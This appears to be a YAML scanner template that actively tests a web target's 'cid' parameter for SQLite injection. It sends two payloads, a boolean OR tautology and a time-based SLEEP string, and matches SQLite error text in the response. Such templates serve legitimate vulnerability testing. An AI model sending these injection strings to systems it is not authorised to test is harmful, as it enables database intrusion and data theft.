id: sqli-sqlite-04
name: 'SQLi error sqlite via cid'
severity: high
type: active
tags:
  - sqli
  - injection
  - sqlite
description: 'Triggers sqlite error via cid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      cid:
        - '" OR "1"="1'
        - ''' AND SLEEP(5)--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQLite'
          - 'sqlite3::'
